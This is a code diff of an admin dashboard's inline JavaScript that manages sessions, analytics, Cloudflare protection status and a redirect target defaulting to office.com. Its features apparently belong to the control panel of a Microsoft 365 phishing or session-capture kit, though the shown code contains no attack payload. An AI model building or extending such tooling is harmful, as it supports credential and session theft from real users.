                 setTimeout(() => loadCloudflareStatus(), 1000);
                 alert('🔓 ALL PROTECTION DISABLED');
             } catch (error) {
@@ -1709,6 +1445,27 @@
                 alert('Network error occurred');
             }
         }
+
+        // Load authentication state when page loads
+        document.addEventListener('DOMContentLoaded', checkAuthOnLoad);
+
+        // Update the updateAuthUI function to include configuration status
+        const originalUpdateAuthUI = updateAuthUI;
+        updateAuthUI = function(authenticated) {
+            originalUpdateAuthUI(authenticated);
+            if (authenticated) {
+                setTimeout(() => loadConfigurationStatus(), 1000);
+            }
+        };
+
+        // Enhanced refresh to include Cloudflare status
+        setInterval(() => {
+            if (isAuthenticated) {
+                loadSessions();
+                loadAnalytics();
+                loadCloudflareStatus();
+            }
+        }, 30000);
 
         // Redirect Configuration Functions
         async function loadRedirectConfig() {
@@ -1721,9 +1478,11 @@
                     const currentUrl = data.redirectUrl || 'https://office.com';
                     document.getElementById('current-redirect-display').textContent = `🎯 ${currentUrl}`;
                     
+                    // Update status
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: var(--success-green); font-weight: bold;">📍 REDIRECT STATUS: ACTIVE → ${currentUrl}</span>`;
+                        `<span style="color: #00ff88; font-weight: bold;">📍 REDIRECT STATUS: ACTIVE → ${currentUrl}</span>`;
                     
+                    // Set dropdown value
                     const select = document.getElementById('redirect-destination');
                     const option = Array.from(select.options).find(opt => opt.value === currentUrl);
                     if (option) {
@@ -1736,13 +1495,13 @@
                 } else {
                     document.getElementById('current-redirect-display').textContent = '❌ Failed to load';
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: var(--primary-red); font-weight: bold;">❌ ERROR: ${data.error}</span>`;
+                        `<span style="color: #ff3333; font-weight: bold;">❌ ERROR: ${data.error}</span>`;
                 }
             } catch (error) {
                 console.error('Error loading redirect config:', error);
                 document.getElementById('current-redirect-display').textContent = '❌ Network Error';
                 document.getElementById('redirect-status').innerHTML = 
-                    `<span style="color: var(--primary-red); font-weight: bold;">❌ NETWORK ERROR</span>`;
+                    `<span style="color: #ff3333; font-weight: bold;">❌ NETWORK ERROR</span>`;
             }
         }
 
@@ -1758,6 +1517,7 @@
                     alert('Please enter a custom URL');
                     return;
                 }
+                // Basic URL validation
                 try {
                     new URL(targetUrl);
                 } catch (e) {
@@ -1778,18 +1538,18 @@
                 if (data.success) {
                     document.getElementById('current-redirect-display').textContent = `🎯 ${targetUrl}`;
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: var(--success-green); font-weight: bold;">✅ UPDATED: ${targetUrl}</span>`;
+                        `<span style="color: #00ff88; font-weight: bold;">✅ UPDATED: ${targetUrl}</span>`;
                     alert(`✅ Redirect destination updated to: ${targetUrl}`);
                 } else {
                     alert('Error: ' + data.error);
                     document.getElementById('redirect-status').innerHTML = 
-                        `<span style="color: var(--primary-red); font-weight: bold;">❌ UPDATE FAILED</span>`;
+                        `<span style="color: #ff3333; font-weight: bold;">❌ UPDATE FAILED</span>`;
                 }
             } catch (error) {
                 console.error('Error updating redirect config:', error);
                 alert('Network error occurred');
                 document.getElementById('redirect-status').innerHTML = 
-                    `<span style="color: var(--primary-red); font-weight: bold;">❌ NETWORK ERROR</span>`;
+                    `<span style="color: #ff3333; font-weight: bold;">❌ NETWORK ERROR</span>`;
             }
         }
 
@@ -1810,14 +1570,41 @@
             }
         });
 
-        // Enhanced refresh to include all status updates
-        setInterval(() => {
-            if (isAuthenticated) {
-                loadSessions();
-                loadAnalytics();
-                loadCloudflareStatus();
+        // Load Cloudflare status when authenticated
+        function updateAuthUI(authenticated) {
+            isAuthenticated = authenticated;
+            const authSection = document.getElementById('auth-section');
+            const authForm = document.getElementById('auth-form');
+            const authSuccess = document.getElementById('auth-success');
+            const loading = document.getElementById('loading');
+            const sessionsContent = document.getElementById('sessions-content');
+            const noSessions = document.getElementById('no-sessions');
+
+            if (authenticated) {
+                authSection.classList.add('authenticated');
+                authForm.style.display = 'none';
+                authSuccess.style.display = 'block';
+                loading.style.display = 'block';
+                sessionsContent.style.display = 'none';
+                noSessions.style.display = 'none';
+                // Load Cloudflare status and redirect config
+                setTimeout(() => {
+                    loadCloudflareStatus();
+                    loadRedirectConfig();
+                }, 500);
+            } else {
+                authSection.classList.remove('authenticated');
+                authForm.style.display = 'block';
+                authSuccess.style.display = 'none';
+                loading.style.display = 'none';
+                sessionsContent.style.display = 'none';
+                noSessions.style.display = 'none';
+                document.getElementById('error').style.display = 'none';
+                // Reset Cloudflare status
+                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
+                document.getElementById('cf-status').style.color = '#ff6666';
             }
-        }, 30000);
+        }
     </script>
 </body>
 </html>
